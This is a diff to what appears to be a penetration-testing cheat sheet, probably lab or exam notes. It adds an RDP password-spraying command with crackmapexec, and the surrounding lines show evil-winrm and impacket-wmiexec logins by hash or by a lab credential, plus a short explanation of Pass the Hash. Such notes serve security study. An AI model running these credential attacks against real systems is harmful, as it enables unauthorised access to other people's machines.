@@ -2533,6 +2533,10 @@ evil-winrm -u <user> -H <hash> -i 172.16.138.83
 ````
 proxychains -q impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
 ````
+###### RDP 
+````
+crackmapexec rdp 192.168.186.191 -u users.txt -p passwords.txt --continue-on-success
+````
 #### Pass the Hash <img src="https://cdn-icons-png.flaticon.com/128/6107/6107027.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/6050/6050858.png" width="40" height="40" />
 The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication.
 ##### third party cheat sheet
